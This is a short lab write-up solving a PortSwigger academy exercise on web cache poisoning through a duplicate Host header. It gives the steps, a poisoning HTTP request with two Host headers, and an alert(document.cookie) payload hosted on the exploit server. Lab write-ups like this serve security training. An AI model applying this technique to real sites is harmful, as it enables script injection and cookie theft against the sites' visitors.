# Lab 03 — Web cache poisoning via ambiguous requests

> **Practitioner** · [Official lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

**Entry point:** the Host is validated for **routing**, but a **second
Host header** is used for building an absolute script URL.

## Solution

1. Cache buster: `GET /?cb=123`.
2. Confirm: a duplicate Host header is ignored for routing yet its value is
   reflected in `<script src="https://.../resources/js/tracking.js">`.
3. Host `alert(document.cookie)` at `/resources/js/tracking.js` on the
   exploit server, then poison:

```http
GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

4. Replay until `X-Cache` hit, then remove the buster and keep re-poisoning
   until the victim visits — lab solved.

## Notes

Two servers disagreeing about which Host counts = "ambiguous request" —
the validator sees one, the URL builder sees the other.
